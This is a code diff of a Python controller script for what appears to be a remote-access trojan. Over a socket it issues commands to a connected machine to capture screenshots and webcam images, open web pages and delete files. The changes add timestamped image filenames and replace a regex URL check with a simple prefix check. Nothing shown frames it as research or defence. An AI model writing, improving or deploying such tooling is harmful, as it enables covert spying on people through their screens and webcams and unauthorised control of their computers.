@@ -1,4 +1,4 @@
-import socket, os, re, time
+import socket, os, time
 
 # Socket Properties
 HOST = "0.0.0.0"
@@ -75,33 +75,33 @@ def UsableCommands():
     print("[-dl] Delete File/Directory            |")
     print("_______________________________________|\n")
 
-def OpenWebpage(pattern="((https?):((//)|(\\\\))+([\w\d:#@%/;$()~_?\+-=\\\.&](#!)?)*)"):
+def OpenWebpage():
     url = input("\nWebpage URL: ")
-    if not (re.match(pattern, url)):
+    if not (url.startswith("http://") or url.startswith("https://")):
         print("(Bad URL, use: http/https)\n")
         return
 
     send(b"open-webpage"); send(url.encode())
     print(recv(1024).decode() + "\n")
 
-def Screenshot():
+def Screenshot(current_time):
     if not (recv(1024).decode() == "success"):
         print("(Error Capturing Screen)\n")
         return
 
     buffersize = recv(1024).decode()
-    with open("screenshot.png", "wb") as ImageFile:
+    with open(f"screenshot{current_time}.png", "wb") as ImageFile:
         ImageFile.write(recvall(int(buffersize)))
 
     print("\n(Screenshot Captured)\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
 
-def Webcam():
+def Webcam(current_time):
     if not (recv(1024).decode() == "success"):
         print("(No Webcam Detected)\n")
         return
 
     buffersize = recv(1024).decode(); Webcam_Name = recv(1024).decode()
-    with open("webcam.png", "wb") as ImageFile:
+    with open(f"webcam{current_time}.png", "wb") as ImageFile:
         ImageFile.write(recvall(int(buffersize)))
 
     print("\n[ Webcam Captured ]\n\n" + f"Name: ({Webcam_Name})\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
@@ -247,9 +247,9 @@ def RemoteCommands():
             elif (command == "-ow"):
                 OpenWebpage()
             elif (command == "-ss"):
-                send(b"capture-screenshot"); Screenshot()
+                send(b"capture-screenshot"); Screenshot("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
             elif (command == "-cw"):
-                send(b"capture-webcam"); Webcam()
+                send(b"capture-webcam"); Webcam("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
             elif (command == "-si"):
                 send(b"test"); SystemInformation()
             elif (command == "-sp"):
